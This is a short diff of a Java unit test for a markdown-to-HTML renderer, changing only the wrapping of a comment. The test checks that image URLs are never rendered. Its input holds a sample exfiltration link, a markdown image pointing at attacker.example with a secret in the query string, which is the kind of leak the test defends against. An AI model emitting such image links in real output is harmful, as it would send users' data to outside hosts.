@@ -37,7 +37,8 @@ class MarkdownHtmlTest {
         assertThat(MarkdownHtml.render("a paragraph")).doesNotContain("id=");
     }
 
-    /// An image renders as its alt text in italics with markup stripped, and its URL appears nowhere, so no request leaks.
+    /// An image renders as its alt text in italics with markup stripped, and its URL appears nowhere, so no request
+    /// leaks.
     @Test
     void anImageBecomesItsAltTextAndItsUrlIsNotRendered() {
         String html = MarkdownHtml.render("Plan ![status of <b>x</b>](https://attacker.example/p.png?d=secret) done");
